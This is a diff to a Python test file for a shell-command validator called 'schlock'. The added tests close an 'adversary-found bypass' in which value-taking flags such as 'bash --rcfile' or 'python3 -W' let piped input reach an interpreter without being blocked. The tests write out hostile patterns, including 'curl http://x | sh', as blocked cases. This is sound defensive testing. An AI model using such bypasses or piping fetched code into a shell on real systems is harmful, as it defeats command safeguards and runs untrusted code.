@@ -122,8 +122,11 @@ class TestReadsStdinAsProgram:
         assert self._f()("bash", ["-s"]) is True
         assert self._f()("python3", ["-"]) is True
 
-    def test_neutral_flag_then_script_is_exempt(self):
-        assert self._f()("python3", ["-u", "app.py"]) is False
+    def test_flag_before_script_is_blocked_fail_closed(self):
+        # Conservative/fail-closed: we cannot tell `-u app.py` (flag+script) from `-W ignore`
+        # (flag+value) without per-flag arity. A leading flag means the following token is treated
+        # as the flag's value, not a script -> dangerous. Friction, not a hole.
+        assert self._f()("python3", ["-u", "app.py"]) is True
 
 
 class TestTopLevelPipeToShell:
@@ -164,3 +167,42 @@ class TestTopLevelPipeToShell:
     # --- regression: existing curl|sh detection intact ---
     def test_curl_pipe_sh_still_blocks(self):
         assert validate_command("curl http://x | sh").risk_level == RiskLevel.BLOCKED
+
+
+class TestPipeToShellValueFlagBypass:
+    """Adversary-found bypass: value-taking flags must not exempt (their value isn't a script)."""
+
+    def _f(self):
+        from schlock.core.parser import _reads_stdin_as_program
+
+        return _reads_stdin_as_program
+
+    def test_helper_blocks_value_flags(self):
+        assert self._f()("bash", ["--rcfile", "/dev/null"]) is True
+        assert self._f()("bash", ["--init-file", "/x"]) is True
+        assert self._f()("bash", ["-O", "extglob"]) is True
+        assert self._f()("python3", ["-W", "ignore"]) is True
+        assert self._f()("python3", ["-X", "dev"]) is True
+        assert self._f()("perl", ["-I", "/tmp"]) is True
+        assert self._f()("ruby", ["-I", "/tmp"]) is True
+        assert self._f()("ruby", ["-E", "utf-8"]) is True
+        assert self._f()("node", ["-r", "fs"]) is True
+
+    def test_end_to_end_blocks(self):
+        for cmd in [
+            "cat x | bash --rcfile /dev/null",
+            "cat x | bash -O extglob",
+            "echo x | python3 -W ignore",
+            "echo x | perl -I /tmp",
+            "echo x | node -r fs",
+        ]:
+            assert validate_command(cmd).risk_level == RiskLevel.BLOCKED, cmd
+
+    def test_legit_uses_still_allowed(self):
+        for cmd in [
+            "cat data | python3 app.py",
+            "echo x | python3 -c 'print(1)'",
+            "foo | bash -c 'echo hi'",
+            "ls | grep x",
+        ]:
+            assert validate_command(cmd).risk_level != RiskLevel.BLOCKED, cmd
